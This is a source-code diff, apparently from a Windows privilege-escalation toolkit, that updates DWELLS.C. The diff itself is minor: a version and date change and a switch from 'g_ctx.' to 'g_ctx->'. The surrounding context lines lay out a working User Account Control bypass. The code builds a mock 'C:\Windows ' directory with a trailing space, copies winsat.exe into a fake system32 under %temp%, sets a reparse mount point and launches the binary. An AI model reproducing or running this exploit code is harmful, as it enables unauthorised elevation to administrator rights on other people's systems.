@@ -4,9 +4,9 @@
 *
 *  TITLE:       DWELLS.C
 *
-*  VERSION:     3.04
+*  VERSION:     3.11
 *
-*  DATE:        10 Nov 2018
+*  DATE:        23 Nov 2018
 *
 *  David Wells based method.
 *
@@ -48,7 +48,7 @@ BOOL ucmDirectoryMockMethod(
         //
         // Create destination dir "system32" in %temp%
         //
-        _strcpy(szPayloadDir, g_ctx.szTempDirectory);
+        _strcpy(szPayloadDir, g_ctx->szTempDirectory);
         _strcat(szPayloadDir, L"system32\\");
         if (!CreateDirectory(szPayloadDir, NULL)) {
             if (GetLastError() != ERROR_ALREADY_EXISTS)
@@ -66,7 +66,7 @@ BOOL ucmDirectoryMockMethod(
         //
         // Copy winsat to %temp%\system32
         //
-        _strcpy(szSource, g_ctx.szSystemDirectory);
+        _strcpy(szSource, g_ctx->szSystemDirectory);
         _strcat(szSource, WINSAT_EXE);
 
         _strcpy(szDest, szPayloadDir);
@@ -82,7 +82,7 @@ BOOL ucmDirectoryMockMethod(
         szSource[1] = L'?';
         szSource[2] = L'?';
         szSource[3] = L'\\';
-        _strncpy(&szSource[4], 4, g_ctx.szSystemRoot, 4);
+        _strncpy(&szSource[4], 4, g_ctx->szSystemRoot, 4);
         _strcat(szSource, L"Windows ");
 
         RtlInitUnicodeString(&usDirectoryName, szSource);
@@ -102,7 +102,7 @@ BOOL ucmDirectoryMockMethod(
         // Set reparse to %temp%.
         //
         _strcpy(szSource, L"\\??\\");
-        _strcat(szSource, g_ctx.szTempDirectory);
+        _strcat(szSource, g_ctx->szTempDirectory);
         supSetMountPoint(
             hFakeWindows,
             szSource,
@@ -112,7 +112,7 @@ BOOL ucmDirectoryMockMethod(
         // Run target application.
         //
         RtlSecureZeroMemory(&szSource, sizeof(szSource));
-        _strncpy(szSource, 4, g_ctx.szSystemRoot, 4);
+        _strncpy(szSource, 4, g_ctx->szSystemRoot, 4);
         _strcat(szSource, L"Windows \\system32\\");
         _strcat(szSource, WINSAT_EXE);
         bResult = supRunProcess(szSource, NULL);
@@ -137,7 +137,7 @@ BOOL ucmDirectoryMockMethod(
         szSource[1] = L'?';
         szSource[2] = L'?';
         szSource[3] = L'\\';
-        _strncpy(&szSource[4], 4, g_ctx.szSystemRoot, 4);
+        _strncpy(&szSource[4], 4, g_ctx->szSystemRoot, 4);
         _strcat(szSource, L"Windows ");
 
         RtlInitUnicodeString(&usDirectoryName, szSource);
